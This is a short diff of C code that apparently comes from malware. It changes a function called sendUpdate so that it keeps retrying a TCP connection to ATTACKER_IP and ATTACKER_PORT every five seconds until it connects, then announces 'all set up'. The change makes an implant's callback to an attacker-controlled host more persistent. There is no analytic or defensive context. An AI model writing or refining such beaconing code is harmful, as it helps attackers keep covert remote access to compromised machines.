@@ -17,18 +17,22 @@ int sendUpdate(){
         int RUN = 1;
         struct sockaddr_in dstAddr;
         
-        connID = socket(AF_INET ,SOCK_STREAM, 0);
-        if(valid(connID,"creation")==1){return 1;}
-        
         dstAddr.sin_family = AF_INET;
         dstAddr.sin_port = htons(ATTACKER_PORT);
-        
         status = inet_pton(AF_INET, ATTACKER_IP, &dstAddr.sin_addr);
         if(valid(status,"inet_pton")==1){return 1;}
         
-        status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
-        if(valid(status,"connect")==1){return 1;}
-        
+        while(RUN){
+            connID = socket(AF_INET ,SOCK_STREAM, 0);
+            status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
+            if(status == 0){
+                RUN = 0;
+            }else{
+                close(connID);
+                sleep(5);
+            }
+            
+        }
         printf("connected\n");
         
         char *hello = "all set up";
